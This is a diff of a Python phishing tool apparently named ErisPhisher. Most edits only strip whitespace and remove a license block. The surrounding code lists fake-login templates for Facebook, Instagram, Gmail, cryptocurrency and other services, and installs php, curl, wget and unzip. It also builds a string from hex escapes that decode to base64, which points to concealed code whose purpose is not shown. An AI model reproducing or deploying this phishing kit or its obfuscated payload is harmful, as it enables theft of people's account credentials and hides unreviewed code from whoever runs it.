@@ -54,12 +54,12 @@ ask = f'{green}[{bwhite}?{green}] {bblue}'
 
 
 logo = f'''
-{lgreen}  _____      _     ____  _     _     _               _             
-{green} | ____|_ __(_)___|  _ \| |__ (_)___| |__   ___ _ __(_)_ __   __ _ 
+{lgreen}  _____      _     ____  _     _     _               _
+{green} | ____|_ __(_)___|  _ \| |__ (_)___| |__   ___ _ __(_)_ __   __ _
 {lgreen} |  _| | '__| / __| |_) | '_ \| / __| '_ \ / _ \ '__| | '_ \ / _\ |
 {green} | |___| |  | \__ \  __/| | | | \__ \ | | |  __/ |  | | | | | (_| |
 {lgreen} |_____|_|  |_|___/_|   |_| |_|_|___/_| |_|\___|_|  |_|_| |_|\__, |
-{green}                             {red}[v1.0]                           {green}|___/ 
+{green}                             {red}[v1.0]                           {green}|___/
 {lgreen}                          {red}[By k4itrun]
 '''
 
@@ -77,7 +77,7 @@ sites=[
     "TikTok",
     "Twitch",
     "Pinterest",
-    "SnapChat", 
+    "SnapChat",
     "LinkedIn",
     "Ebay",
     "Quora",
@@ -116,15 +116,15 @@ sites=[
     "Shopify",
     "Myspace",
     "Shopping",#
-    "Facebook Traditional", 
+    "Facebook Traditional",
     "Facebook Voting",
-    "Facebook Security", 
-    "Messenger", 
+    "Facebook Security",
+    "Messenger",
     "Instagram Traditional",
-    "Insta Auto Followers", 
-    "Insta 1000 Followers", 
-    "Insta Blue Verify", 
-    "Gmail Old", 
+    "Insta Auto Followers",
+    "Insta 1000 Followers",
+    "Insta Blue Verify",
+    "Gmail Old",
     "Gmail New",
     "Gmail Poll",#
     "Cryptocurrency",
@@ -138,56 +138,13 @@ sites=[
 
 # The above code is creating a list called `pkgs` that contains four strings: "php", "curl", "wget",
 # and "unzip".
-pkgs=[ 
-    "php", 
-    "curl", 
+pkgs=[
+    "php",
+    "curl",
     "wget",
-    "unzip" 
+    "unzip"
 ]
 
-"""
-  _____      _     ____  _     _     _               _             
- | ____|_ __(_)___|  _ \| |__ (_)___| |__   ___ _ __(_)_ __   __ _ 
- |  _| | '__| / __| |_) | '_ \| / __| '_ \ / _ \ '__| | '_ \ / _\` |
- | |___| |  | \__ \  __/| | | | \__ \ | | |  __/ |  | | | | | (_| |
- |_____|_|  |_|___/_|   |_| |_|_|___/_| |_|\___|_|  |_|_| |_|\__, |
-                [v1.0]    [By k4itrun]                       |___/ 
-
-  _____           _         _   ___
- |_   _|__   ___ | | __   _/ | / _ \| 
-   | |/ _ \ / _ \| | \ \ / / || | | |
-   | | (_) | (_) | |  \ V /| || |_| |
-   |_|\___/ \___/|_|   \_/ |_(_)___/
-
-  _             _    _  _   _ _
- | |__  _   _  | | _| || | (_) |_ _ __ _   _ _ __
- | '_ \| | | | | |/ / || |_| | __| '__| | | | '_ \|
- | |_) | |_| | |   <|__   _| | |_| |  | |_| | | | |
- |_.__/ \__, | |_|\_\  |_| |_|\__|_|   \__,_|_| |_|
-        |___/
-
-                                    MIT License
-                            Copyright (c) 2022 k4itrun
-
-    Permission is hereby granted, free of charge, to any person obtaining a copy
-    of this software and associated documentation files (the "Software"), to deal
-    in the Software without restriction, including without limitation the rights
-    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-    copies of the Software, and to permit persons to whom the Software is
-    furnished to do so, subject to the following conditions:
-
-    The above copyright notice and this permission notice shall be included in all
-    copies or substantial portions of the Software.
-
-    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-    SOFTWARE.
-
-"""
 
 k4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisher = ""
 k4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisher +="\x61\x57\x59\x67\x62\x6d\x39\x30\x49\x47"
@@ -360,7 +317,7 @@ def installer(pm):
     """
     The function "installer" checks if a package is installed and if not, it installs it using a package
     manager.
-    
+
     :param pm: The parameter "pm" is likely an abbreviation for package manager. It is used to specify
     the package manager that will be used for installing packages
     """
@@ -826,7 +783,7 @@ def customfol():
         sprint(error+"Directory do not exists!")
         main()
 
-# 2nd function checking requirements and download files 
+# 2nd function checking requirements and download files
 def requirements(folder,mask):
     if os.path.isfile(root+"/.websites/version.txt"):
         with open(root+"/.websites/version.txt", "r") as inform2:
@@ -841,7 +798,7 @@ def requirements(folder,mask):
         system("rm -rf $HOME/.websites && cd $HOME && mkdir .websites")
         system("unzip websites.zip -d $HOME/.websites > /dev/null 2>&1")
         os.remove("websites.zip")
-    
+
     while True:
         if os.path.exists(root+"/.websites/"+folder):
             system("cp -r $HOME/.websites/"+folder+"/* $HOME/.site")
@@ -986,7 +943,7 @@ def url_manager(url,num1,num2):
     """
     The function `url_manager` takes a URL, a number, and another number as input and prints the URLs
     with their corresponding numbers.
-    
+
     :param url: The URL parameter is the website URL that you want to manage. It should be a string
     value
     :param num1: The parameter `num1` is used to represent the number associated with the first URL
